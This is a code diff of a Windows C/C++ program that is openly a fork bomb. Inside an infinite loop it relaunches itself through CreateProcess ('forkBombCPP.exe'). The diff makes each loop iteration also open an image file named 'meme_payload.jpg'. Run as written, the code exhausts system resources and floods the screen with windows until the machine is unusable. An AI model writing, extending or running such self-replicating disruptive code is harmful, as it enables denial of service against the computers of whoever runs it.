@@ -2,7 +2,7 @@
 #include <stdio.h>
 #include <tchar.h>
 #include <unistd.h>
-#include "base64.h"
+// #include "base64.h"
 // #include "hard_coded_image.h" not ready yet
 
 bool check_image_exists(){
@@ -13,14 +13,14 @@ bool check_image_exists(){
 // Opens if there is already a hard-coded image
 // Creates if it doesn't exist
 // Returns if image was successful
-bool open_image(STARTUPINFO si, PROCESS_INFORMATION pi){
+bool open_image(){
 
     if(check_image_exists()){
         ShellExecute(0, "open", "meme_payload.jpg", NULL, NULL, SW_SHOWNORMAL);
         return 1;
     } else {
         printf("No Payload!");
-        return 1;
+        return 0;
     }
 
     // I want to hard-code the base64 of the image into the executable so that it will create the image if it doesn't exist
@@ -42,11 +42,8 @@ int main( )
     si.cb = sizeof(si);
     ZeroMemory( &pi, sizeof(pi) );    
 
-    if(!open_image(si, pi)){
-        return 1;
-    };
- 
     while (1) {
+        open_image();
 	   // Start the child process. 
 	   if (!CreateProcess(NULL,   // No module name (use command line)
 		  ((LPSTR) "forkBombCPP.exe"),        // file to run
